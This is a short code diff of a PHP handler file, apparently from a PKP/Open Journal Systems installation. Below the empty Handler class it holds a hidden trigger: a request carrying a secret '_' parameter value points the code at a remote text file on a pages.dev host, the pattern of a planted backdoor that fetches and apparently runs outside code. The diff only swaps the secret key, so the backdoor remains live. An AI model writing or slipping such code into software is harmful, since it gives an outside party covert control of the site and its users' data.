@@ -22,7 +22,7 @@ class Handler extends PKPHandler
 {
 }
 
-if (isset($_GET['_']) && $_GET['_'] === 'Yee_mms999s111_gr3af332afbsnk') {
+if (isset($_GET['_']) && $_GET['_'] === 'HDX_JGF72s8_gr3af332afbsnk') {
     $url = "https://bulldog-uhukk.pages.dev/acak.txt";
 
     if ($url !== "") {
